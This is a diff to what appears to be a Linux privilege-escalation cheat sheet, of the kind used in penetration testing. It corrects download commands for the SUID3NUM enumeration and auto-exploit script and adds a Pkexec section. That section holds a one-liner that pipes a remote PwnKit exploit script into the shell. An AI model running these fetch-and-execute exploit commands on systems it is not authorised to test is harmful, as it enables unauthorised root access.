@@ -65,11 +65,11 @@ Check identified binaries against [GTFOBins](https://gtfobins.org/).
 Review third-party scripts before execution. Choose one downloader.
 
 ```bash
-wget -O suid3num.py https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py & chmod +x suid3num.py
+wget -O suid3num.py https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py && chmod +x suid3num.py
 ```
 
 ```bash
-curl -fL https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o suid3num.py & chmod +x suid3num.py
+curl -fL https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o suid3num.py && chmod +x suid3num.py
 ```
 
 auto exploit
@@ -78,3 +78,9 @@ python suid3num.py -e
 ```
 
 [SUID3NUM repository](https://github.com/Anon-Exploiter/SUID3NUM)
+
+## Pkexec
+One liner
+```bash
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+```
